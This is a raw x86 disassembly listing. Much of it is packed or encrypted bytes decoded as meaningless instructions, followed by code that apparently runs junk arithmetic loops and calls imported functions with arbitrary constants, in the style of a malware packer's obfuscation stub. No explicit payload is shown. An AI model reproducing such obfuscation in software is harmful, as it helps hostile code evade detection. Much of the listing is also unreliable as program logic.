  4145ce:	sbb    al,0xe
  4145d0:	fst    DWORD PTR [esp+ebp*8+0x14]
  4145d4:	push   0x2a4072e1
  4145d9:	test   eax,0xb63c99cd
  4145df:	or     edi,DWORD PTR fs:[eax+edi*4]
  4145e3:	shr    DWORD PTR [eax-0x53f6666f],0xac
  4145ea:	push   ds
  4145eb:	mov    al,0xed
  4145ed:	cmp    eax,DWORD PTR [ebp+eax*1+0x7c48e030]
  4145f4:	bswap  ecx
  4145f6:	mov    cl,0x9f
  4145f8:	lods   al,BYTE PTR ds:[esi]
  4145f9:	mov    ebx,0x8084b0a9
  4145fe:	jl     0x414598
  414600:	cdq    
  414601:	mov    edx,0x635ef8ca
  414606:	mov    WORD PTR ds:0xc8c80641,?
  41460c:	cld    
  41460d:	retf   
  41460e:	bound  ecx,QWORD PTR [edx+0x48]
  414611:	jo     0x414649
  414613:	iret   
  414614:	jbe    0x414601
  414616:	dec    ecx
  414617:	fdivr  DWORD PTR [ebp+0x16]
  41461a:	sar    BYTE PTR [ebx],0x79
  41461d:	pop    edi
  41461e:	inc    edi
  41461f:	mov    eax,0x9b727cd5
  414624:	imul   eax,ecx,0x66bbf6f1
  41462a:	adc    ah,BYTE PTR [esi+ebx*8-0x2f10052b]
  414631:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  414633:	call   0x2e07:0x40e4fff
  41463a:	bound  ecx,QWORD PTR [ebx]
  41463c:	das    
  41463d:	pop    eax
  41463e:	in     eax,0x21
  414640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414641:	sub    esp,DWORD PTR [ebx]
  414643:	xchg   BYTE PTR [esi],al
  414645:	int3   
  414646:	sbb    cl,bl
  414648:	mov    eax,ds:0x2e4af716
  41464d:	mov    esi,0x6338d5ac
  414652:	bound  ebx,QWORD PTR [eax+esi*8]
  414655:	fiadd  DWORD PTR [edx-0x10]
  414658:	shr    DWORD PTR [esi+0x7e],1
  41465b:	xchg   BYTE PTR [esi-0xb6482c8],al
  414661:	dec    eax
  414662:	call   0xd9dd:0xb60d9ed6
  414669:	cs stos DWORD PTR es:[edi],eax
  41466b:	jns    0x414673
  41466d:	sahf   
  41466e:	stos   BYTE PTR es:[edi],al
  41466f:	(bad)  
  414670:	test   al,0xa0
  414672:	pushf  
  414673:	ds jge 0x414654
  414676:	arpl   WORD PTR [ebp+ecx*8-0x47aea0c6],ax
  41467d:	pushf  
  41467e:	inc    ecx
  41467f:	xchg   edi,eax
  414680:	mul    DWORD PTR [ebp+0x171140d7]
  414686:	push   0x5
  414688:	jge    0x414649
  41468a:	xchg   esi,eax
  41468b:	inc    edx
  41468c:	jle    0x4146a9
  41468e:	cli    
  41468f:	rcl    BYTE PTR [ebx+0x26],0xc7
  414693:	and    ebp,0xfd3ee740
  414699:	(bad)  
  41469a:	jle    0x4146e3
  41469c:	jno    0x41467c
  41469e:	pop    esi
  41469f:	xchg   DWORD PTR [esi],edx
  4146a1:	pusha  
  4146a2:	call   0x1f124070
  4146a7:	dec    edi
  4146a8:	int    0xd2
  4146aa:	btc    DWORD PTR [ebp-0x3],eax
  4146ae:	std    
  4146af:	std    
  4146b0:	in     al,dx
  4146b1:	cmp    bh,BYTE PTR [ebx+0x34fec713]
  4146b7:	mov    eax,ds:0x7914f2da
  4146bc:	jle    0x4146e4
  4146be:	xchg   edi,eax
  4146bf:	xor    dh,ch
  4146c1:	aas    
  4146c2:	jp     0x41465a
  4146c4:	fcomp  DWORD PTR [edi-0x2c8a94d5]
  4146ca:	or     eax,0x357e8621
  4146cf:	push   edx
  4146d0:	loope  0x414703
  4146d2:	rol    bh,cl
  4146d4:	test   bl,0x6a
  4146d7:	push   es
  4146d8:	mov    ecx,0x5024c830
  4146dd:	mov    ebx,0x3a7353aa
  4146e2:	xor    esp,edx
  4146e4:	or     al,bl
  4146e6:	leave  
  4146e7:	adc    eax,edx
  4146e9:	fwait
  4146ea:	dec    edi
  4146eb:	fidiv  WORD PTR [edx]
  4146ed:	icebp  
  4146ee:	bound  esi,QWORD PTR [edi+0x4deedbbc]
  4146f4:	add    BYTE PTR [edi-0x829cfe1],ah
  4146fa:	(bad)  
  4146fb:	aam    0xe1
  4146fd:	ror    BYTE PTR [eax],cl
  4146ff:	add    eax,0x64023b06
  414704:	shl    DWORD PTR ds:0xc0788bbc,0x47
  41470b:	in     al,0xd
  41470d:	test   ah,ch
  41470f:	out    0x99,al
  414711:	ins    DWORD PTR es:[edi],dx
  414712:	std    
  414713:	xor    esi,0x1f685578
  414719:	stc    
  41471a:	push   esi
  41471b:	call   0x439ad90
  414720:	jmp    0xb86055e5
  414725:	repz (bad) 
  414727:	pop    eax
  414728:	inc    edi
  414729:	mov    eax,0x5e878504
  41472e:	repnz cmp BYTE PTR [ebp+0xea03e3],dh
  414735:	lea    ebx,[edi-0x1f]
  414738:	imul   DWORD PTR [edx]
  41473a:	pop    ecx
  41473b:	push   DWORD PTR [edx+0x6adccc72]
  414741:	or     eax,0xbd1bbe78
  414746:	inc    edx
  414747:	mov    cl,0x3b
  414749:	and    ebx,DWORD PTR [ecx*8-0x31fb4a67]
  414750:	jmp    0x11e7:0x6f9ef5eb
  414757:	es pop ss
  414759:	mov    eax,DWORD PTR [ecx+ebp*2-0x50]
  41475d:	in     al,dx
  41475e:	pop    ss
  41475f:	and    eax,0x211c8d3
  414764:	nop
  414765:	dec    ebp
  414766:	cmp    eax,0x7406a8b
  41476b:	mov    esi,0xf4d519d8
  414770:	rcl    al,cl
  414772:	scas   al,BYTE PTR es:[edi]
  414773:	pop    ss
  414774:	aam    0x96
  414776:	sub    esp,edi
  414778:	pop    esi
  414779:	sub    al,0x43
  41477b:	pushf  
  41477c:	stos   BYTE PTR es:[edi],al
  41477d:	call   0x77cc3945
  414782:	cmp    eax,0xdfb8b591
  414787:	xchg   edi,eax
  414788:	and    dh,BYTE PTR [ecx+0x3c1201d9]
  41478e:	add    DWORD PTR [esp+eax*1-0x7d],esp
  414792:	mov    ebp,0x6cbc8f00
  414797:	fist   WORD PTR [esi]
  414799:	sbb    eax,0x380a2dc
  41479e:	xor    DWORD PTR [ecx-0x66510066],ebx
  4147a4:	vunpckhps ymm3,ymm1,YMMWORD PTR [ecx-0x3e]
  4147a9:	(bad)  
  4147aa:	pushf  
  4147ab:	hlt    
  4147ac:	cs jmp 0x86bb:0x62b22d93
  4147b4:	cwde   
  4147b5:	cld    
  4147b6:	jle    0x4147af
  4147b8:	pusha  
  4147b9:	cdq    
  4147ba:	rcl    DWORD PTR ds:0x2d9e0943,1
  4147c0:	es gs jmp 0xf1fa:0x9c5a9309
  4147c9:	jb     0x4147d2
  4147cb:	sti    
  4147cc:	pop    DWORD PTR [edx+0x3048b0b7]
  4147d2:	int    0xf7
  4147d4:	adc    DWORD PTR [ebx+ecx*8],esi
  4147d7:	pop    eax
  4147d8:	dec    edi
  4147d9:	inc    edi
  4147da:	and    edi,esp
  4147dc:	adc    BYTE PTR [edi-0xe],dh
  4147df:	gs cmp DWORD PTR ss:[ecx-0x28327d48],esi
  4147e7:	inc    esp
  4147e8:	lock cdq 
  4147ea:	enter  0xfffd,0xc3
  4147ee:	hlt    
  4147ef:	rol    BYTE PTR [ecx-0x7ea8e2b],cl
  4147f5:	adc    BYTE PTR [esi+ecx*8],ch
  4147f8:	out    0xe0,al
  4147fa:	icebp  
  4147fb:	mov    esp,0xb54d35c5
  414800:	sbb    al,0x3c
  414802:	mov    esp,0xacb1c736
  414807:	fiadd  WORD PTR [esi]
  414809:	sub    edi,DWORD PTR [edx]
  41480b:	js     0x414792
  41480d:	aaa    
  41480e:	mov    bl,0x83
  414810:	inc    eax
  414811:	inc    edi
  414812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414813:	outs   dx,DWORD PTR ds:[esi]
  414814:	ret    0x70fc
  414817:	push   esi
  414818:	add    BYTE PTR [edi-0xa49fdd3],bl
  41481e:	call   0x4ce4b49c
  414823:	and    ebp,DWORD PTR [ecx-0x484f4d31]
  414829:	cli    
  41482a:	add    bl,BYTE PTR [ebp-0x6f]
  41482d:	pop    edi
  41482e:	and    BYTE PTR [ebp+0x3],ah
  414831:	pop    ecx
  414832:	test   al,0xb4
  414834:	out    dx,al
  414835:	mov    eax,ds:0x34453e8b
  41483a:	retf   
  41483b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41483c:	or     ebx,DWORD PTR [ebp+0x21]
  41483f:	cmp    DWORD PTR [edx-0x10],esi
  414842:	xor    al,0x67
  414844:	(bad)  
  414845:	scas   al,BYTE PTR es:[edi]
  414846:	push   ecx
  414847:	test   eax,0xad34bc36
  41484c:	add    dl,ch
  41484e:	(bad)  
  41484f:	mov    edx,0xd83d1926
  414854:	push   ss
  414855:	into   
  414856:	sub    al,0x77
  414858:	cmp    BYTE PTR [edi],al
  41485a:	pop    ebp
  41485b:	push   cs
  41485c:	fbld   TBYTE PTR [ebp-0x440214df]
  414862:	cli    
  414863:	test   al,0x15
  414865:	cs int3 
  414867:	mov    ds:0xec16d217,al
  41486c:	ja     0x41484f
  41486e:	lea    edx,[ebx]
  414870:	mov    eax,0xbcea6937
  414875:	mov    dl,0xed
  414877:	jg     0x4148be
  414879:	(bad)
  41487c:	pop    ebx
  41487d:	and    al,0x6d
  41487f:	les    esp,FWORD PTR [ebx+0x7]
  414882:	mov    bh,0x6f
  414884:	jns    0x4148aa
  414886:	sub    eax,0x1fa8001d
  41488b:	sar    BYTE PTR [eax-0x11a8cf94],0x5a
  414892:	outs   dx,DWORD PTR ds:[esi]
  414893:	or     eax,0xae0830a
  414898:	mov    al,0x43
  41489a:	scas   eax,DWORD PTR es:[edi]
  41489b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41489c:	ins    BYTE PTR es:[edi],dx
  41489d:	cmc    
  41489e:	pop    es
  41489f:	rcl    DWORD PTR [edx],1
  4148a1:	push   ds
  4148a2:	test   al,0xd6
  4148a4:	fst    QWORD PTR [edx-0x16]
  4148a7:	pushf  
  4148a8:	dec    ecx
  4148a9:	xchg   edx,eax
  4148aa:	mul    BYTE PTR ss:[ecx]
  4148ad:	jns    0x41491a
  4148af:	(bad)  
  4148b1:	int3   
  4148b2:	rdmsr  
  4148b4:	mov    al,0xc9
  4148b6:	add    ebx,edi
  4148b8:	stos   BYTE PTR es:[edi],al
  4148b9:	dec    ebx
  4148ba:	mov    al,0x64
  4148bc:	repz les edi,FWORD PTR [ebx]
  4148bf:	jbe    0x414927
  4148c1:	repz cdq 
  4148c3:	pop    esi
  4148c4:	adc    al,0xb1
  4148c6:	add    BYTE PTR [edi-0x35],dh
  4148c9:	sub    cl,BYTE PTR [edx-0x5b]
  4148cc:	inc    edx
  4148cd:	mov    ebp,0xb8698522
  4148d2:	dec    edx
  4148d3:	sub    ecx,DWORD PTR ds:0x6f135a0a
  4148d9:	push   0x6d
  4148db:	loope  0x4148bc
  4148dd:	inc    ebx
  4148de:	or     ebp,DWORD PTR [esi-0x79acdf9f]
  4148e4:	fcomi  st,st(3)
  4148e6:	icebp  
  4148e7:	outs   dx,BYTE PTR ds:[esi]
  4148e8:	jmp    0xed127a0f
  4148ed:	inc    ebp
  4148ee:	adc    ch,ah
  4148f0:	mov    ah,0x77
  4148f2:	rcr    BYTE PTR [ecx],0xd
  4148f5:	enter  0x8a11,0xcf
  4148f9:	hlt    
  4148fa:	jp     0x414932
  4148fc:	cmp    dl,bh
  4148fe:	push   ss
  4148ff:	enter  0xdddc,0xd8
  414903:	fdivr  st,st(2)
  414905:	in     al,0x59
  414907:	inc    edi
  414908:	fnstenv [eax-0x1e]
  41490b:	or     DWORD PTR [edx],eax
  41490d:	rcr    esp,1
  41490f:	cdq    
  414910:	adc    al,0x87
  414912:	js     0x414895
  414914:	push   esi
  414915:	lods   eax,DWORD PTR ds:[esi]
  414916:	(bad)  
  414917:	pop    ds
  414918:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414919:	xchg   esp,eax
  41491a:	shr    BYTE PTR [edx+0x63],0xf9
  41491e:	xor    edx,DWORD PTR [esi-0x41]
  414921:	sti    
  414922:	mov    ?,WORD PTR [esi]
  414924:	or     dl,BYTE PTR [edx-0x18]
  414927:	call   FWORD PTR [edi]
  414929:	xlat   BYTE PTR ds:[ebx]
  41492a:	aas    
  41492b:	sub    BYTE PTR [esi],dh
  41492d:	pop    eax
  41492e:	or     bh,ah
  414930:	addr16 push esp
  414932:	xchg   esp,eax
  414933:	cmp    bl,BYTE PTR [ebx]
  414935:	popa   
  414936:	imul   esp,edi,0x14
  414939:	mov    WORD PTR [eax-0x4f3f1b3],?
  41493f:	test   eax,0x232a5bae
  414944:	inc    edx
  414945:	or     ch,al
  414947:	sar    BYTE PTR [edi-0x6c],0xaf
  41494b:	aad    0xe0
  41494d:	lds    esp,FWORD PTR [ebx]
  41494f:	ss pop ss
  414951:	not    DWORD PTR [edi+0x65e5f83b]
  414957:	aam    0x38
  414959:	push   edi
  41495a:	fldcw  WORD PTR [eax+0xb6ffe6d]
  414960:	mov    eax,ds:0xf68adfc0
  414965:	pop    esp
  414966:	pusha  
  414967:	push   esi
  414968:	push   ss
  414969:	js     0x41495c
  41496b:	jl     0x414980
  41496d:	stos   DWORD PTR es:[edi],eax
  41496e:	xchg   ebx,eax
  41496f:	jbe    0x414947
  414971:	mov    al,ds:0x166c7662
  414976:	dec    esp
  414977:	mov    esi,ebp
  414979:	rol    edx,cl
  41497b:	mov    BYTE PTR [ebx+0x56fdd202],ah
  414981:	sbb    al,al
  414983:	xchg   ecx,eax
  414984:	inc    edi
  414985:	mov    bl,0x19
  414987:	(bad)  
  414988:	in     eax,dx
  414989:	stc    
  41498a:	in     eax,0x12
  41498c:	or     bl,BYTE PTR [eax]
  41498e:	iret   
  41498f:	push   ss
  414990:	(bad)  
  414991:	ins    BYTE PTR es:[edi],dx
  414992:	dec    esp
  414993:	push   ss
  414994:	call   0x1b77:0xf01f61c5
  41499b:	add    BYTE PTR [ebp+0xa],bl
  41499e:	push   ebp
  41499f:	mov    edx,0xde0d5815
  4149a4:	shl    dh,1
  4149a6:	fcom   DWORD PTR [eax]
  4149a8:	popa   
  4149a9:	rol    BYTE PTR [ebx+0x3f2ea2b],cl
  4149af:	push   edi
  4149b0:	hlt    
  4149b1:	pop    ss
  4149b2:	cmp    al,0x6a
  4149b4:	lea    di,[esi+0x53]
  4149b8:	push   ds
  4149b9:	push   esp
  4149ba:	das    
  4149bb:	sub    ah,0x5
  4149be:	mov    al,0x89
  4149c0:	push   0xffffff9e
  4149c2:	cmp    ah,dh
  4149c4:	jge    0x4149ba
  4149c6:	das    
  4149c7:	fsubr  QWORD PTR [edi+0x2f]
  4149ca:	cmp    edi,DWORD PTR [eax-0x29]
  4149cd:	les    ebx,FWORD PTR [edi+0x69aefdc3]
  4149d3:	or     DWORD PTR [eax+ebx*1-0x64],edx
  4149d7:	and    al,0xf8
  4149d9:	call   0xfe5dc315
  4149de:	out    0x12,al
  4149e0:	pop    esp
  4149e1:	loop   0x4149a2
  4149e3:	into   
  4149e4:	dec    esi
  4149e5:	inc    eax
  4149e6:	pop    ebp
  4149e7:	int3   
  4149e8:	sbb    edx,esp
  4149ea:	nop
  4149eb:	xchg   ebx,eax
  4149ec:	mov    edx,0xfb5864a2
  4149f1:	rol    DWORD PTR [ebx+0x71bfb8fb],1
  4149f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149f8:	rcl    DWORD PTR ds:0xd7f35933,cl
  4149fe:	ja     0x4149ef
  414a00:	dec    edx
  414a01:	test   al,0xe6
  414a03:	sahf   
  414a04:	pop    edx
  414a05:	sub    al,0xdf
  414a07:	mov    al,BYTE PTR [ecx-0x51]
  414a0a:	outs   dx,DWORD PTR ds:[esi]
  414a0b:	mov    ds:0x87bbd61f,al
  414a10:	popf   
  414a11:	adc    eax,0xa54bbdee
  414a16:	out    dx,eax
  414a17:	nop
  414a18:	xchg   ebp,eax
  414a19:	loop   0x414a2a
  414a1b:	mov    fs,WORD PTR [ecx+0x34a86ebe]
  414a21:	les    eax,FWORD PTR [ecx+0x52]
  414a24:	jge    0x4149e3
  414a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a27:	mov    eax,ds:0x9e29ee15
  414a2c:	pop    esi
  414a2d:	lods   al,BYTE PTR ds:[esi]
  414a2e:	fsubr  QWORD PTR [edx]
  414a30:	or     eax,0x92b7a5e3
  414a35:	lods   al,BYTE PTR ds:[esi]
  414a36:	and    esi,DWORD PTR [esi+0x6a]
  414a39:	cmp    ch,BYTE PTR [eax]
  414a3b:	and    BYTE PTR [eax-0x34],bh
  414a3e:	ret    0x30b2
  414a41:	pop    eax
  414a42:	retf   
  414a43:	jae    0x414a10
  414a45:	dec    esi
  414a46:	sar    BYTE PTR [ecx-0xfdd0f7],1
  414a4c:	fisttp QWORD PTR [edi-0x4728fe42]
  414a52:	cmp    BYTE PTR [eax],cl
  414a54:	sbb    dh,ch
  414a56:	dec    edi
  414a57:	xchg   edi,eax
  414a58:	pop    edi
  414a59:	outs   dx,DWORD PTR ds:[esi]
  414a5a:	shr    BYTE PTR [edi],1
  414a5c:	int    0x97
  414a5e:	test   BYTE PTR [esi+esi*2+0x72],ah
  414a62:	test   DWORD PTR [edx-0xfea6b39],ecx
  414a68:	add    BYTE PTR [edx-0x5c],0x7
  414a6c:	dec    esp
  414a6d:	int    0x59
  414a6f:	ds adc eax,0xea975ef7
  414a75:	js     0x414a00
  414a77:	push   esi
  414a78:	repz popf 
  414a7a:	jno    0x414a4a
  414a7c:	in     al,0xd0
  414a7e:	inc    eax
  414a7f:	fld    DWORD PTR [ebp+ecx*1-0x2b1046e1]
  414a86:	(bad)  
  414a87:	repz mov eax,ds:0x8dfc9a78
  414a8d:	mov    ds:0xb8ed144b,al
  414a92:	sbb    ebp,0xbdfaa444
  414a98:	out    dx,eax
  414a99:	pop    es
  414a9a:	mov    ds:0x3845eb1d,eax
  414a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aa0:	sub    al,0xce
  414aa2:	cs sahf 
  414aa4:	jae    0x414a76
  414aa6:	adc    eax,DWORD PTR [esp+eax*8-0x75fc93eb]
  414aad:	add    ch,cl
  414aaf:	nop
  414ab0:	(bad)  
  414ab1:	jp     0x414a8d
  414ab3:	stos   DWORD PTR es:[edi],eax
  414ab4:	popf   
  414ab5:	xchg   esi,eax
  414ab6:	and    al,0xfb
  414ab8:	es jge 0x414ad3
  414abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414abc:	stos   BYTE PTR es:[edi],al
  414abd:	sub    eax,0xf11b7e84
  414ac2:	outs   dx,BYTE PTR ds:[esi]
  414ac3:	mov    BYTE PTR [eax],ch
  414ac5:	jmp    0x7de9:0xdf1913d4
  414acc:	lahf   
  414acd:	sbb    ch,BYTE PTR [esi]
  414acf:	cmc    
  414ad0:	jmp    0x414a6c
  414ad2:	rcl    eax,1
  414ad4:	inc    esi
  414ad5:	inc    ecx
  414ad6:	rol    DWORD PTR [esi+0x2c2de5e8],cl
  414adc:	xchg   edx,eax
  414add:	pop    es
  414ade:	daa    
  414adf:	mov    ds:0x19776d3a,eax
  414ae4:	call   0x1a4b:0xf5a36848
  414aeb:	sub    eax,DWORD PTR [ecx+0x163da6c9]
  414af1:	in     al,dx
  414af2:	adc    eax,0xa3eda951
  414af7:	stos   BYTE PTR es:[edi],al
  414af8:	xor    eax,0x9fe6dc60
  414afd:	xor    BYTE PTR [ebx-0x73],bl
  414b00:	jae    0x414afb
  414b02:	(bad)  
  414b03:	xchg   ecx,eax
  414b04:	inc    ecx
  414b05:	inc    esp
  414b06:	sbb    BYTE PTR [ecx],0xf8
  414b09:	dec    esi
  414b0a:	adc    eax,0x73ced67d
  414b0f:	fs push cs
  414b11:	fisubr WORD PTR [edi]
  414b13:	push   es
  414b14:	mov    ecx,0x89b78bde
  414b19:	aam    0x3c
  414b1b:	mov    ebx,0xfc2022b
  414b20:	addr16 (bad) 
  414b22:	xchg   ebx,eax
  414b23:	jl     0x414b2a
  414b25:	push   esp
  414b26:	add    bl,0x28
  414b29:	shl    ch,1
  414b2b:	aam    0x1
  414b2d:	jnp    0x414ba7
  414b2f:	inc    ebx
  414b30:	shl    DWORD PTR [ebp-0x2c],0x81
  414b34:	icebp  
  414b35:	ret    0xc2f1
  414b38:	xchg   ebp,eax
  414b39:	push   eax
  414b3a:	inc    edx
  414b3b:	push   cs
  414b3c:	aad    0xa0
  414b3e:	inc    ecx
  414b3f:	pop    ds
  414b40:	int    0xb9
  414b42:	mov    dh,0xda
  414b44:	inc    ecx
  414b45:	call   DWORD PTR [ecx+0x73]
  414b48:	jmp    0xf527afb4
  414b4d:	dec    esp
  414b4e:	ins    DWORD PTR es:[edi],dx
  414b4f:	xchg   ecx,eax
  414b50:	dec    eax
  414b51:	rsm    
  414b53:	aas    
  414b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b55:	adc    bh,BYTE PTR [ecx]
  414b57:	or     ecx,ebp
  414b59:	cmp    ch,al
  414b5b:	xor    eax,0xd26f4c6
  414b60:	adc    ah,BYTE PTR [ecx]
  414b62:	shl    DWORD PTR [ebx+0x8],1
  414b65:	dec    eax
  414b66:	fistp  WORD PTR [ebx+0x28b9c5af]
  414b6c:	mov    eax,ds:0x9e2b7b68
  414b71:	mov    ah,0xd7
  414b73:	sti    
  414b74:	test   DWORD PTR [esi-0x30],ebp
  414b77:	mov    DWORD PTR [ebx],edx
  414b79:	in     al,dx
  414b7a:	inc    esp
  414b7b:	in     eax,0x43
  414b7d:	dec    ebp
  414b7e:	dec    eax
  414b7f:	and    al,0xc0
  414b81:	in     al,dx
  414b82:	xlat   BYTE PTR ds:[ebx]
  414b83:	push   ds
  414b84:	pop    ss
  414b85:	xchg   esi,eax
  414b86:	xor    BYTE PTR [esi-0x3628219e],dh
  414b8c:	jno    0x414b47
  414b8e:	(bad)  
  414b8f:	je     0x414bad
  414b91:	jo     0x414b3f
  414b93:	inc    edi
  414b94:	std    
  414b95:	dec    edx
  414b96:	mov    ebp,0x86e7f0ee
  414b9b:	cwde   
  414b9c:	xchg   ecx,eax
  414b9d:	jp     0x414be4
  414b9f:	xor    DWORD PTR [eax+0x192512ab],0x3d
  414ba6:	daa    
  414ba7:	pop    esp
  414ba8:	mov    al,ds:0x391d1442
  414bad:	or     edi,DWORD PTR [edx]
  414baf:	imul   ecx,DWORD PTR [ecx+0x458b0c45],0xf8758bfc
  414bb9:	xor    eax,edx
  414bbb:	xor    esi,edx
  414bbd:	add    eax,ecx
  414bbf:	add    esi,ecx
  414bc1:	imul   eax,esi
  414bc4:	mov    esi,DWORD PTR [ebp+0xc]
  414bc7:	cmp    esi,eax
  414bc9:	mov    eax,DWORD PTR [ebp-0x4]
  414bcc:	je     0x412846
  414bd2:	xor    eax,edx
  414bd4:	add    eax,ecx
  414bd6:	mov    ecx,DWORD PTR [ebp+0xc]
  414bd9:	imul   eax,ecx
  414bdc:	add    eax,DWORD PTR [ebp+0x8]
  414bdf:	mov    DWORD PTR [ebp+0xc],eax
  414be2:	mov    eax,DWORD PTR [ebp+0xc]
  414be5:	pop    esi
  414be6:	leave  
  414be7:	ret    0x8
  414bea:	push   ebp
  414beb:	mov    ebp,esp
  414bed:	sub    esp,0x80
  414bf3:	add    DWORD PTR ds:0x42f014,ebx
  414bf9:	push   ebx
  414bfa:	and    DWORD PTR ds:0x42f01c,0x0
  414c04:	jmp    0x414c14
  414c09:	mov    eax,ds:0x42f01c
  414c0e:	inc    eax
  414c0f:	mov    ds:0x42f01c,eax
  414c14:	cmp    DWORD PTR ds:0x42f01c,0x18
  414c1b:	jae    0x414c59
  414c21:	cmp    DWORD PTR ds:0x42f01c,0x4
  414c28:	jne    0x414c3c
  414c2e:	push   0x423845
  414c33:	push   DWORD PTR [ebp-0x18]
  414c36:	call   DWORD PTR ds:0x42a020
  414c3c:	cmp    DWORD PTR ds:0x42f01c,0x3
  414c43:	jne    0x414c54
  414c49:	mov    eax,ds:0x42f01c
  414c4e:	inc    eax
  414c4f:	mov    ds:0x42f01c,eax
  414c54:	jmp    0x414c09
  414c59:	push   esi
  414c5a:	push   edi
  414c5b:	xor    esi,esi
  414c5d:	and    DWORD PTR ds:0x42e020,0x0
  414c67:	mov    eax,ds:0x42e020
  414c6c:	inc    eax
  414c6d:	mov    ds:0x42e020,eax
  414c72:	cmp    DWORD PTR ds:0x42e020,0x6
  414c79:	jne    0x414c94
  414c7f:	push   0x604d
  414c84:	push   0x431010
  414c89:	push   0x87a0
  414c8e:	call   DWORD PTR ds:0x42a024
  414c94:	cmp    DWORD PTR ds:0x42e020,0x5
  414c9b:	jne    0x414cac
  414ca1:	mov    eax,ds:0x42e020
  414ca6:	inc    eax
  414ca7:	mov    ds:0x42e020,eax
  414cac:	cmp    DWORD PTR ds:0x42e020,0x12
  414cb3:	jb     0x414c67
  414cb9:	add    eax,DWORD PTR ds:0x43101c
  414cbf:	mov    DWORD PTR [ebp-0x3c],esi
  414cc2:	add    edi,0x12fa
  414cc8:	mov    eax,DWORD PTR [ebp-0x18]
  414ccb:	push   0x20
  414ccd:	sub    DWORD PTR ds:0x431018,0x2d06
  414cd7:	mov    DWORD PTR [ebp-0x18],eax
  414cda:	and    edi,0x295f
  414ce0:	pop    edi
  414ce1:	sbb    DWORD PTR ds:0x42e004,0x42e010
  414ceb:	push   0x41c667
  414cf0:	push   0x41c67f
  414cf5:	add    DWORD PTR ds:0x430014,0x2555
  414cff:	push   0x78987697
  414d04:	neg    DWORD PTR ds:0x42e00c
  414d0a:	push   0x76867875
  414d0f:	call   DWORD PTR ds:0x42a000
  414d15:	sub    DWORD PTR ds:0x42e018,0x784c
  414d1f:	mov    DWORD PTR [ebp-0x24],eax
  414d22:	mov    eax,ds:0x42f008
  414d27:	add    DWORD PTR ds:0x42e024,eax
  414d2d:	mov    eax,DWORD PTR [ebp-0x24]
  414d30:	test   eax,eax
  414d32:	mov    DWORD PTR ds:0x42e028,0x4d32
  414d3c:	je     0x414dbd
  414d42:	sbb    DWORD PTR ds:0x42e018,0x4fa5
  414d4c:	push   esi
  414d4d:	sub    DWORD PTR ds:0x431000,0x5f3f
  414d57:	push   0x67687687
  414d5c:	call   DWORD PTR ds:0x42a004
  414d62:	push   esi
  414d63:	and    DWORD PTR ds:0x42e01c,0x42f014
  414d6d:	push   0x65
  414d6f:	adc    DWORD PTR ds:0x432000,0x3582
  414d79:	push   0xb
  414d7b:	adc    DWORD PTR ds:0x42f014,0x4445
  414d85:	push   0x1
  414d87:	push   0x1
  414d89:	sbb    DWORD PTR ds:0x42f000,0x1222
  414d93:	push   0x78786675
  414d98:	or     DWORD PTR ds:0x432008,0x430010
  414da2:	call   DWORD PTR ds:0x42a008
  414da8:	add    DWORD PTR ds:0x430018,0x406b
  414db2:	push   0x98798797
  414db7:	call   DWORD PTR ds:0x42a00c
  414dbd:	dec    edi
  414dbe:	jne    0x414ce1
  414dc4:	mov    DWORD PTR ds:0x430014,0xbd
  414dce:	mov    eax,DWORD PTR [ebp-0x18]
  414dd1:	mov    DWORD PTR ds:0x42e014,0x595a
  414ddb:	mov    ebx,0xf89c85b6
  414de0:	mov    DWORD PTR ds:0x430008,0x1404
  414dea:	cmp    eax,ebx
  414dec:	mov    DWORD PTR ds:0x42e00c,0x7600
  414df6:	jne    0x414e3c
  414dfc:	mov    DWORD PTR ds:0x41c663,0xf89c85b9
  414e06:	sub    DWORD PTR ds:0x42f010,0x430010
  414e10:	push   DWORD PTR [ebp+0x10]
  414e13:	push   DWORD PTR [ebp+0xc]
  414e16:	push   DWORD PTR [ebp+0x8]
  414e19:	sbb    DWORD PTR ds:0x431000,0x42e00c
  414e23:	call   0x4103d4
  414e28:	xor    DWORD PTR ds:0x432014,edx
  414e2e:	mov    ecx,DWORD PTR ds:0x41c553
  414e34:	mov    ecx,DWORD PTR [ecx+0x1cc]
  414e3a:	mov    DWORD PTR [ecx],eax
  414e3c:	mov    DWORD PTR [ebp-0x4],ebx
  414e3f:	mov    esi,DWORD PTR ds:0x423817
  414e45:	xor    ecx,ecx
  414e47:	xor    ecx,DWORD PTR ds:0x42381b
  414e4d:	sub    ecx,esi
  414e4f:	imul   esi,DWORD PTR [esi+ecx*1]
  414e53:	mov    DWORD PTR [ebp-0x8],0xf89c85b9
  414e5a:	lea    eax,[ebp-0x44]
  414e5d:	adc    ecx,0x842
  414e63:	mov    DWORD PTR [ebp-0x3c],eax
  414e66:	lea    eax,[ebp-0x48]
  414e69:	mov    DWORD PTR [ebp-0x24],eax
  414e6c:	inc    eax
  414e6d:	mov    eax,ds:0x41c553
  414e72:	sbb    DWORD PTR ds:0x42f018,0xd8b
  414e7c:	mov    eax,DWORD PTR [eax+0x1c8]
  414e82:	and    DWORD PTR ds:0x42f008,0x694f
  414e8c:	mov    eax,DWORD PTR [eax]
  414e8e:	mov    ecx,DWORD PTR [ebp-0x24]
  414e91:	mov    esi,0x7510891
  414e96:	mov    DWORD PTR ds:0x432008,0x17
  414ea0:	cmp    DWORD PTR ds:0x432008,0x0
  414ea7:	je     0x414ed7
  414ead:	cmp    DWORD PTR ds:0x432008,0x21
  414eb4:	jne    0x414ec5
  414eba:	push   0x423927
  414ebf:	call   DWORD PTR ds:0x42a028
  414ec5:	mov    edi,DWORD PTR ds:0x432008
  414ecb:	dec    edi
  414ecc:	mov    DWORD PTR ds:0x432008,edi
  414ed2:	jmp    0x414ea0
  414ed7:	xor    eax,esi
  414ed9:	adc    edi,0x4ee7
  414edf:	mov    edi,0x3272d9
  414ee4:	sbb    DWORD PTR ds:0x42e01c,0x430018
  414eee:	add    eax,edi
